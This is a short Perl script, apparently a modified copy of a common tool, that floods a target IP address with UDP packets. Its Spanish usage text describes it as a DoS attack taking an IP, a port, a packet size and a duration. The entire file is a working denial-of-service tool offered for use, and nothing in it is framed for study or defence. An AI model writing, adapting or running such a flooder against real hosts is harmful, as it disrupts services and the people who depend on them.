#!/usr/bin/perl

##############
# udp flood.
##############
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print " \n";

print "\n";
print "\n";           
print     "UDP DoS Script Modificada Por: Hexhork\n";

print "\n";
print "--------------------------------------------\n";
print "Comando: Perl UDP.pl <ip> <port> <num> <time>\n";

print "--------------------------------------------\n";
print "\n";
print "--------------------------------------------\n";
print "port: Puerto a atacar. 0 = Aleatorio.\n";

print "--------------------------------------------\n";
print "\n";
print "--------------------------------------------\n";
print "num: Medida de paquetes a enviar.\n";
print "--------------------------------------------\n";
print "\n";
print "--------------------------------------------\n";
print "time: Tiempo de ataque en segundos.\n";

print "--------------------------------------------\n";
print "\n";
print "\n";  
exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Imposible atacar a $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

 
print "Empezando ataque DoS a $ip" . ($port ? $port : "random") . ", enviando" . 
  ($size ? "$size-byte" : "random size") . " paquetes" . 
  ($time ? " durante $time segundos" : "") . "\n";
print "Ataque Iniciado. Ctrl-C\n Para Detenerlo" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(30000))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));} 